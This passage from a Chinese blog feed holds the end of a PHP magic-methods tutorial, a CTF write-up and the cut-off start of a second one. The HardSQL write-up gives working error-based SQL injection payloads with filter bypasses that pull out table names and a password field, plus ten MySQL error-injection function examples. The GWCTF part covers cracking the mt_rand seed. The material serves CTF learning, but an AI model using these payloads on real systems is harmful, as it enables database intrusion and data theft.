class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="function"><span class="keyword">function</span> <span class="title">__set_state</span><span class="params">($an_array)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        $a = <span class="keyword">new</span> Person();</span><br><span class="line">        $a-&gt;name = $an_array[<span class="string">'name'</span>];</span><br><span class="line">        <span class="keyword">return</span> $a;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line">$person-&gt;name = <span class="string">'小红'</span>;</span><br><span class="line">var_export($person);</span><br></pre></td></tr></table></figure><p>继续看结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Person::__set_state(array( &apos;sex&apos; =&gt; &apos;男&apos;, &apos;name&apos; =&gt; &apos;小红&apos;, &apos;age&apos; =&gt; 25, ))</span><br></pre></td></tr></table></figure><h3 id="clone-，当对象复制完成时调用"><a href="#clone-，当对象复制完成时调用" class="headerlink" title="__clone()，当对象复制完成时调用"></a>__clone()，当对象复制完成时调用</h3><p>在多数情况下，我们并不需要完全复制一个对象来获得其中属性。但有一个情况下确实需要：如果你有一个 GTK 窗口对象，该对象持有窗口相关的资源。你可能会想复制一个新的窗口，保持所有属性与原来的窗口相同，但必须是一个新的对象（因为如果不是新的对象，那么一个窗口中的改变就会影响到另一个窗口）。还有一种情况：如果对象 A 中保存着对象 B 的引用，当你复制对象 A 时，你想其中使用的对象不再是对象 B 而是 B 的一个副本，那么你必须得到对象 A 的一个副本。</p><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">对象复制可以通过 clone 关键字来完成（如果可能，这将调用对象的 __clone() 方法）。对象中的 __clone() 方法不能被直接调用。</span><br></pre></td></tr></table></figure><p>语法：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$copy_of_object = clone $object;</span><br></pre></td></tr></table></figure><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">当对象被复制后，PHP 5 会对对象的所有属性执行一个浅复制（shallow copy）。所有的引用属性 仍然会是一个指向原来的变量的引用。</span><br><span class="line"></span><br><span class="line">当复制完成时，如果定义了 __clone() 方法，则新创建的对象（复制生成的对象）中的 __clone() 方法会被调用，可用于修改属性的值（如果有必要的话）。</span><br></pre></td></tr></table></figure><p>看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">Person</span></span></span><br><span class="line"><span class="class"></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> $sex;</span><br><span class="line">    <span class="keyword">public</span> $name;</span><br><span class="line">    <span class="keyword">public</span> $age;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($name=<span class="string">""</span>,  $age=<span class="number">25</span>, $sex=<span class="string">'男'</span>)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;name = $name;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;age  = $age;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;sex  = $sex;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__clone</span><span class="params">()</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">echo</span> <span class="keyword">__METHOD__</span>.<span class="string">"你正在克隆对象&lt;br&gt;"</span>;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">$person = <span class="keyword">new</span> Person(<span class="string">'小明'</span>); <span class="comment">// 初始赋值</span></span><br><span class="line">$person2 = <span class="keyword">clone</span> $person;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="string">'persion1:'</span>);</span><br><span class="line">var_dump($person);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;br&gt;'</span>;</span><br><span class="line">var_dump(<span class="string">'persion2:'</span>);</span><br><span class="line">var_dump($person2);</span><br></pre></td></tr></table></figure><p>看结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">Person::__clone你正在克隆对象</span><br><span class="line">string(9) &quot;persion1:&quot; object(Person)#1 (3) &#123; [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; string(6) &quot;小明&quot; [&quot;age&quot;]=&gt; int(25) &#125; </span><br><span class="line">string(9) &quot;persion2:&quot; object(Person)#2 (3) &#123; [&quot;sex&quot;]=&gt; string(3) &quot;男&quot; [&quot;name&quot;]=&gt; string(6) &quot;小明&quot; [&quot;age&quot;]=&gt; int(25) &#125;</span><br></pre></td></tr></table></figure><p>克隆成功。</p><h3 id="autoload-，尝试加载未定义的"><a href="#autoload-，尝试加载未定义的" class="headerlink" title="__autoload()，尝试加载未定义的"></a>__autoload()，尝试加载未定义的</h3><p>作用：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">你可以通过定义这个函数来启用类的自动加载。</span><br></pre></td></tr></table></figure><p>在魔术函数 <code>__autoload()</code> 方法出现以前，如果你要在一个程序文件中实例化100个对象，那么你必须用include或者require包含进来100个类文件，或者你把这100个类定义在同一个类文件中 —— 相信这个文件一定会非常大，然后你就痛苦了。</p><p>但是有了 <code>__autoload()</code> 方法，以后就不必为此大伤脑筋了，这个类会在你实例化对象之前自动加载制定的文件。</p><p>还是通过例子来看看吧：</p><p>先看看以往的方式：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 文件non_autoload.php </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line">   </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'project/class/A.php'</span>);  </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'project/class/B.php'</span>);  </span><br><span class="line"><span class="keyword">require_once</span>(<span class="string">'project/class/C.php'</span>);  </span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> (条件A) &#123;  </span><br><span class="line">    $a = <span class="keyword">new</span> A();  </span><br><span class="line">    $b = <span class="keyword">new</span> B();  </span><br><span class="line">    $c = <span class="keyword">new</span> C();  </span><br><span class="line">    <span class="comment">// … 业务逻辑  </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (条件B) &#123;  </span><br><span class="line">    $a = newA();  </span><br><span class="line">    $b = <span class="keyword">new</span> B();  </span><br><span class="line">    <span class="comment">// … 业务逻辑  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>看到了吗？不用100个，只是3个看起来就有点烦了。而且这样就会有一个问题：如果脚本执行“条件B”这个分支时，C.php这个文件其实没有必要包含。因为，任何一个被包含的文件，无论是否使用，均会被php引擎编译。如果不使用，却被编译，这样可以被视作一种资源浪费。更进一步，如果C.php包含了D.php，D.php包含了E.php。并且大部分情况都执行“条件B”分支，那么就会浪费一部分资源去编译C.php,D.php,E.php三个“无用”的文件。</p><p>那么如果使用 <code>__autoload()</code> 方式呢？</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/** </span></span><br><span class="line"><span class="comment"> * 文件autoload_demo.php </span></span><br><span class="line"><span class="comment"> */</span> </span><br><span class="line"><span class="function"><span class="keyword">function</span>  <span class="title">__autoload</span><span class="params">($className)</span> </span>&#123;  </span><br><span class="line">    $filePath = “project/<span class="class"><span class="keyword">class</span>/</span>&#123;$className&#125;.php”;  </span><br><span class="line">    <span class="keyword">if</span> (is_readable($filePath)) &#123;  </span><br><span class="line">        <span class="keyword">require</span>($filePath);  </span><br><span class="line">    &#125;  </span><br><span class="line">&#125;  </span><br><span class="line">   </span><br><span class="line"><span class="keyword">if</span> (条件A) &#123;  </span><br><span class="line">    $a = <span class="keyword">new</span> A();  </span><br><span class="line">    $b = <span class="keyword">new</span> B();  </span><br><span class="line">    $c = <span class="keyword">new</span> C();  </span><br><span class="line">    <span class="comment">// … 业务逻辑  </span></span><br><span class="line">&#125; <span class="keyword">else</span> <span class="keyword">if</span> (条件B) &#123;  </span><br><span class="line">    $a = newA();  </span><br><span class="line">    $b = <span class="keyword">new</span> B();  </span><br><span class="line">    <span class="comment">// … 业务逻辑  </span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>ok,不论效率怎么用，最起码界面看起来舒服多了，没有太多冗余的代。</p><p>再来看看这里的效率如何，我们分析下：</p><p>当php引擎第一次使用类A，但是找不到时，会自动调用 <code>__autoload</code> 方法，并将类名“A”作为参数传入。所以，我们在 <code>__autoload()</code> 中需要的做的就是根据类名，找到相应的文件，并包含进来，如果我们的方法也找不到，那么php引擎就会报错了。</p><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里可以只用require，因为一旦包含进来后，php引擎再遇到类A时，将不会调用__autoload，而是直接使用内存中的类A，不会导致多次包含。</span><br></pre></td></tr></table></figure><p>扩展：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">其实php发展到今天，已经有将 `spl_autoload_register` — 注册给定的函数作为 __autoload 的实现了，但是这个不在啊本文讲解之内，有兴趣可以自行看手册。</span><br></pre></td></tr></table></figure><h3 id="debugInfo-，打印所需调试信息"><a href="#debugInfo-，打印所需调试信息" class="headerlink" title="__debugInfo()，打印所需调试信息"></a>__debugInfo()，打印所需调试信息</h3><p>注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">该方法在PHP 5.6.0及其以上版本才可以用，如果你发现使用无效或者报错，请查看啊你的版本。</span><br></pre></td></tr></table></figure><p>看代码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">C</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> $prop;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__construct</span><span class="params">($val)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">$this</span>-&gt;prop = $val;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">/**</span></span><br><span class="line"><span class="comment">     * <span class="doctag">@return</span> array</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__debugInfo</span><span class="params">()</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> [</span><br><span class="line">            <span class="string">'propSquared'</span> =&gt; <span class="keyword">$this</span>-&gt;prop ** <span class="number">2</span>,</span><br><span class="line">        ];</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">var_dump(<span class="keyword">new</span> C(<span class="number">42</span>));</span><br></pre></td></tr></table></figure><p>结果：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">object(C)#1 (1) &#123; [&quot;propSquared&quot;]=&gt; int(1764) &#125;</span><br></pre></td></tr></table></figure><p>再次注意：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">这里的 `**` 是乘方的意思，也是在PHP5.6.0及其以上才可以使用，详情请查看PHP手册</span><br></pre></td></tr></table></figure><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>以上就是PHP中我了解到的魔术方法了，常用的包括 <code>__set()</code> <code>__get()</code> <code>__autoload</code>() 等应该熟悉，其他的了解也没有关系，毕竟知识不怕多嘛。</p><p>好了，有兴趣的或者我这里没有说明白的，可以参考啊官方文档。</p><p><a href="http://php.net/manual/zh/" target="_blank" rel="noopener">PHP在线手册地址</a></p><p><a href="https://segmentfault.com/a/1190000007250604" target="_blank" rel="noopener">参考链接</a></p>]]></content>
    
    <summary type="html">
    
      &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;PHP中把以两个下划线__开头的方法称为魔术方法(Magic methods)，这些方法在PHP中充当了举足轻重的作用。 魔术方法包括：&lt;/p&gt;
    
    </summary>
    
    
      <category term="PHP" scheme="http://goudanjun.vip/tags/PHP/"/>
    
  </entry>
  
  <entry>
    <title> [极客大挑战 2019]HardSQL</title>
    <link href="http://goudanjun.vip/2021/01/17/%E6%9E%81%E5%AE%A2%E5%A4%A7%E6%8C%91%E6%88%98-2019-HardSQL.html/"/>
    <id>http://goudanjun.vip/2021/01/17/极客大挑战-2019-HardSQL.html/</id>
    <published>2021-01-17T12:23:22.000Z</published>
    <updated>2021-01-17T13:01:57.415Z</updated>
    
    <content type="html"><![CDATA[<h1 id="极客大挑战-2019-HardSQL"><a href="#极客大挑战-2019-HardSQL" class="headerlink" title="[极客大挑战 2019]HardSQL"></a>[极客大挑战 2019]HardSQL</h1><p>考点：报错注入</p><a id="more"></a><p>XPATH报错；过滤了空格，等号，and</p><p>爆数据库</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'^extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">database</span>())),<span class="number">0x7e</span>))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># geek</span></span><br></pre></td></tr></table></figure><p>爆表名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'^(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(table_name))<span class="keyword">from</span>(information_schema.tables)<span class="keyword">where</span>(table_schema)<span class="keyword">like</span>(<span class="string">'geek'</span>)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># H4rDsq1</span></span><br></pre></td></tr></table></figure><p>爆列名</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'or(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">group_concat</span>(column_name))<span class="keyword">from</span>(information_schema.columns)<span class="keyword">where</span>(table_name)<span class="keyword">like</span>(<span class="string">'H4rDsq1'</span>)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># id,username,password</span></span><br></pre></td></tr></table></figure><p>爆字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'or(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">password</span>)<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># flag&#123;731351f9-6bb1-4cef-acb7-1c</span></span><br></pre></td></tr></table></figure><p>由于只有一半 所以我们用 left()和right() 函数来爆后面的字段</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">&amp;password=admin'or(extractvalue(1,concat(0x7e,(<span class="keyword">select</span>(<span class="keyword">right</span>(<span class="keyword">password</span>,<span class="number">30</span>))<span class="keyword">from</span>(H4rDsq1)),<span class="number">0x7e</span>)))%<span class="number">23</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 9-6bb1-4cef-acb7-1ceb55c45a02&#125;</span></span><br></pre></td></tr></table></figure><p>最后得到flag：flag{731351f9-6bb1-4cef-acb7-1ceb55c45a02}</p><p>注：“^” 在 sql 语句中是异或的作用也可以换成 or；由于过滤了空格可以使用()绕过；过滤了“=”可以使用 like 绕过；由于是 XPATH 报错我们可以使用 extractvalue()或者updatexml()报错注入</p><h2 id="十种报错函数"><a href="#十种报错函数" class="headerlink" title="十种报错函数"></a>十种报错函数</h2><p>1.floor()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (<span class="keyword">select</span> <span class="number">1</span> <span class="keyword">from</span> (<span class="keyword">select</span> <span class="keyword">count</span>(*),<span class="keyword">concat</span>(<span class="keyword">user</span>(),<span class="keyword">floor</span>(<span class="keyword">rand</span>(<span class="number">0</span>)*<span class="number">2</span>))x <span class="keyword">from</span> information_schema.tables <span class="keyword">group</span> <span class="keyword">by</span> x)a);</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/OJdbi2PIDCGuUYq.png" alt="1016026-20160928204840594-1429421338"></p><p>2.extractvalue()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (extractvalue(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>)));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/JHdtuBIy72gipjn.png" alt="1016026-20160928205421297-407989251"></p><p>3.updatexml()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> (updatexml(<span class="number">1</span>,<span class="keyword">concat</span>(<span class="number">0x7e</span>,(<span class="keyword">select</span> <span class="keyword">user</span>()),<span class="number">0x7e</span>),<span class="number">1</span>));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/zA2VyeRTUQHEiIO.png" alt="1016026-20160928205451969-1920882857"></p><p>4.geometrycollection()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> geometrycollection((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/fpcINsh9ZyKXgVP.png" alt="1016026-20160928205719485-521701933"></p><p>5.multipoint()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipoint((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/MXgDKYI4SNCoLiT.png" alt="1016026-20160928205942266-563740245"></p><p>6.polygon()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> polygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/lCxvQr1HV42pOF8.png" alt="1016026-20160928205828281-760176387"></p><p>7.multipolygon()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multipolygon((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/ypix3XkH1Nc7Gwm.png" alt="1016026-20160928210038094-1420034123"></p><p>8.linestring()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> linestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/l8H3vJfcneDSCRw.png" alt="1016026-20160928210144438-1099086559"></p><p>9.multilinestring()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> multilinestring((<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a)b));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/5j1tVEkunLWd8gA.png" alt="1016026-20160928210420750-344279412"></p><p>10.exp()</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> <span class="keyword">test</span> <span class="keyword">where</span> <span class="keyword">id</span>=<span class="number">1</span> <span class="keyword">and</span> <span class="keyword">exp</span>(~(<span class="keyword">select</span> * <span class="keyword">from</span>(<span class="keyword">select</span> <span class="keyword">user</span>())a));</span><br></pre></td></tr></table></figure><p><img src="https://i.loli.net/2021/01/14/U6LYBpoODh7ISrk.png" alt="1016026-20160928210533313-2028104812"></p>]]></content>
    
    <summary type="html">
    
      &lt;h1 id=&quot;极客大挑战-2019-HardSQL&quot;&gt;&lt;a href=&quot;#极客大挑战-2019-HardSQL&quot; class=&quot;headerlink&quot; title=&quot;[极客大挑战 2019]HardSQL&quot;&gt;&lt;/a&gt;[极客大挑战 2019]HardSQL&lt;/h1&gt;&lt;p&gt;考点：报错注入&lt;/p&gt;
    
    </summary>
    
    
      <category term="CTF" scheme="http://goudanjun.vip/tags/CTF/"/>
    
      <category term="SQL注入" scheme="http://goudanjun.vip/tags/SQL%E6%B3%A8%E5%85%A5/"/>
    
      <category term="报错注入" scheme="http://goudanjun.vip/tags/%E6%8A%A5%E9%94%99%E6%B3%A8%E5%85%A5/"/>
    
  </entry>
  
  <entry>
    <title>[GWCTF 2019]枯燥的抽奖</title>
    <link href="http://goudanjun.vip/2021/01/17/GWCTF-2019-%E6%9E%AF%E7%87%A5%E7%9A%84%E6%8A%BD%E5%A5%96.html/"/>
    <id>http://goudanjun.vip/2021/01/17/GWCTF-2019-枯燥的抽奖.html/</id>
    <published>2021-01-17T12:23:07.000Z</published>
    <updated>2021-01-17T13:02:15.895Z</updated>
    
    <content type="html"><![CDATA[<h1 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h1><p>考点：php伪随机数</p><a id="more"></a><p>check.php中有 mt_srand()和mt_rand()两个伪随机函数</p><p><img src="https://i.loli.net/2021/01/13/WwCku1RMVsdAPI8.png" alt="image-20210113181832863"></p><p>这里用到了php伪随机的种子爆破，利用网上的c语言脚本：<a href="https://www.openwall.com/php_mt_seed/" target="_blank" rel="noopener">php_mt_seed</a></p><p>逆向题目中的加密函数，使符合脚本的输入规范</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">'abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ'</span></span><br><span class="line">str2=<span class="string">'A5rgiREesS'</span></span><br><span class="line">str3 = str1[::<span class="number">-1</span>]</span><br><span class="line">length = len(str2)</span><br><span class="line">res=<span class="string">''</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(len(str2)):</span><br><span class="line">    <span class="keyword">if</span> i&lt;=length/<span class="number">2</span>:</span><br><span class="line">        <span class="keyword">for</span> j <span class="keyword">in</span> range(len(str1)):</span><br><span class="line">            <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">                res+=str(j)+<span class="string">' '</span>+str(j)+<span class="string">' '</span>+<span class="string">'0'</span>+<span class="string">' '</span>+str(len(str1)<span class="number">-1</span>)+<span class="string">' '</span></span><br><span class="line">                <span class="keyword">break</span></span><br><span class="line">print(res)</span><br><span class="line"><span class="comment">#36 36 0 61 31 31 0 61 17 17 0 61 6 6 0 